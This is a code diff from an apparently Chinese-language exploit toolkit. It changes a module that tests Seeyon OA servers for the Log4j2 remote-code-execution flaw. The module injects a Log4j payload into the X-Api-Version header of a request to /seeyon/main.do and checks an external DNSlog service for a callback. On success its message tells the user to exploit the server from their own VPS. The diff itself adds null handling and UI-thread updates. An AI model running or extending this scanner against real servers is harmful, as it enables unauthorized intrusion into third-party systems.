@@ -2,6 +2,9 @@ package exp.oa.seeyonoa;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import java.util.Objects;
+import java.util.concurrent.TimeUnit;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -28,20 +31,40 @@ public class seeyonoa_main_log4j2 implements Exploitlnterface {
         head.put("X-Api-Version", log4jpayload);
 
         Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
+        try {
+            TimeUnit.SECONDS.sleep(3);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        if (Objects.isNull(dns_le1)|| Objects.isNull(dns_le1.getText())){
+            // throw new RuntimeException("当前那EXP返回 null");
+            Platform.runLater(()->{
+                textArea.appendText("\n");
+              textArea.appendText("seeyonoa_main_log4j2-RCE 当前那EXP返回 null");
+            });
+            return false;
+        }
         int dns_1 = dns_le1.getText().length();
 
         Response response = HttpTools.get(url + "/seeyon/main.do", head, "utf-8");
-        try { Thread.sleep (5000) ;
-        } catch (Exception ie){}
+        try {
+          TimeUnit.SECONDS.sleep(5);
+        } catch (InterruptedException e) {
+          e.printStackTrace();
+        }
 
         Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
         int dns_2 = dns_le2.getText().length();
 
         if(dns_2 > dns_1 && response.getCode() == 200){
-            textArea.appendText("\n log4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
+            Platform.runLater(()->{
+              textArea.appendText("\n log4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
+            });
             return true;
         }else {
-            textArea.appendText("\n seeyonoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
+            Platform.runLater(()->{
+              textArea.appendText("\n seeyonoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
+            });
             return false;
         }
 
